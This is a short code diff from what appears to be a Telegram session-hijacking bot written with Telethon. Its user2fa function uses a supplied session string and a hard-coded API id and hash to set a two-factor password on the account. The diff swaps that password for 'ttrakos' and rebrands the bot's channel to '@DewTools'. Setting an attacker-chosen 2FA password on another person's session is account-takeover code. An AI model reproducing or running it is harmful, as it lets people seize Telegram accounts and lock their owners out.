@@ -73,7 +73,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('LEGENDXISBEST')
+      await X.edit_2fa('ttrakos')
       return True
     except:
       return False
@@ -145,10 +145,10 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "@LordAbdulla  - @c_wbot"
+channel = "@DewTools"
 menu = '''
 
-**@LordAbdulla  - @c_wbot**
+**@LordAbdulla  - @DewTools**
 
 
 
